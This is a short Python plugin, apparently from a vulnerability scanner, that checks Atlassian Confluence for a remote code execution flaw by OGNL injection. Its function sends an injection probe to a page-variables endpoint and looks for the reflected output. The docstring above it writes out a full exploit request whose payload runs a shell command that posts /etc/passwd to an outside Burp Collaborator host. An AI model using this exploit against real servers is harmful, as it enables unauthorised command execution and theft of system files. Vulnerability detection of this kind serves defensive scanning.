# -*- coding: utf-8 -*-
# Atlassian Confluence 远程代码执行漏洞
# https://nox.qianxin.com/article/307
# exp：https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md
"""
# 漏洞利用
POST /pages/createpage-entervariables.action HTTP/1.1
Host: [Yourhosts]
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 206

queryString=test%5cu0027,(linkCreation)(0xd0ff90),%5cu0027xxx&linkCreation=@java.lang.Runtime@getRuntime().exec('curl -X POST --data-binary @/etc/passwd w52om3zq3db7v0s37zcbisn5cwim6b.burpcollaborator.net')
"""
import requests
from plugin.target_parse import get_standard_url


def poc(url):
    try:
        url = get_standard_url(url)
        url = url + "/pages/doenterpagevariables.action"
        paramsPost = {
            "queryString": "aaa\\u0027+\x23{\\u0022\\u0022[\\u0022class\\u0022]}+\\u0027bbb"}
        headers = {"User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; de) Opera 8.0",
                   "Content-Type": "application/x-www-form-urlencoded"}
        response = requests.post(url, data=paramsPost,
                                 headers=headers, timeout=5)
        if "aaa{class java.lang.String=null}bbb" in response.text:
            return True
    except:
        pass
    return False
